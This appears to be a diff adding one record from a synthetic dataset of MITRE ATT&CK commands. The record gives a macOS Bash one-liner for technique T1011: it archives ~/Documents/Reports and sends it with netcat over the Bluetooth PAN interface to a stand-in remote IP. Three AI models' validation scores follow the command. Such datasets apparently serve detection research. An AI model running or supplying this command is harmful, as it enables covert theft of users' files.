@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar czf - ~/Documents/Reports | nc -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 203.0.113.50 55812",
+  "explanation": "Exfiltrates a compressed archive over the Bluetooth PAN interface by binding netcat to that service's IP, aligning with T1011 (use of an alternate network medium).",
+  "rationale_steps": [
+    "Query Bluetooth PAN IP via networksetup",
+    "Bind netcat to the Bluetooth PAN address (distinct medium)",
+    "Stream compressed data to a high, uncommon TCP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-e814cd6b",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quotes, valid flags, correct command substitution, and proper piping.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives and streams data via nc bound to the Bluetooth PAN IP, aligning with T1011, though it depends on the PAN having an active IP and route to the destination.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:43:25.259537Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, parentheses, and braces, proper pipe operators, valid flags for tar (czf) and nc (-s), and a correctly structured command substitution using awk.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements T1011 by extracting the Bluetooth PAN IP via networksetup, binding netcat to that interface with -s, and streaming a compressed archive to a remote host, though the -s flag behavior in netcat for source binding varies by implementation and the awk pattern '/IP address/' may not exactly match macOS networksetup output formatting.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:01:25.892736Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid bash syntax, correctly nested command substitution, and standard flags for tar, awk, and netcat.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively forces exfiltration traffic through the Bluetooth PAN interface by binding the netcat source address to the interface's assigned IP, perfectly matching T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:01:27.507294Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
